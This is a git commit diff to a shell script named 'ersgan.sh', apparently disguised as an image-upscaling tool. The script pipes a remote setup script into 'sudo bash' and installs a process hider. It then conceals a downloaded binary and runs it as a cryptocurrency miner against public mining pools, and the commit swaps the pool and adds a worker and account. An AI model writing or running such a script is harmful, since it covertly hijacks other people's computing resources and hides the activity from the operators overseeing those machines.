4313e9e7964b25138ccabb9fac7368c1de3e5b06
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-12 21:15:01 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -1,6 +1,6 @@
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
-ph add sky
-chmod +x sky
-./sky -c stratum+ssl://na.luckpool.net:3958 -u ADDRESS.WORKER -p x
+ph add co
+chmod +x co
+./co -pool_uri=pool.us.woolypooly.com:40000 -worker=angel -devices=0 -account=WPMYW5nZWxlbmNhbmRpbGFkb0BnbWFpbC5jb20 
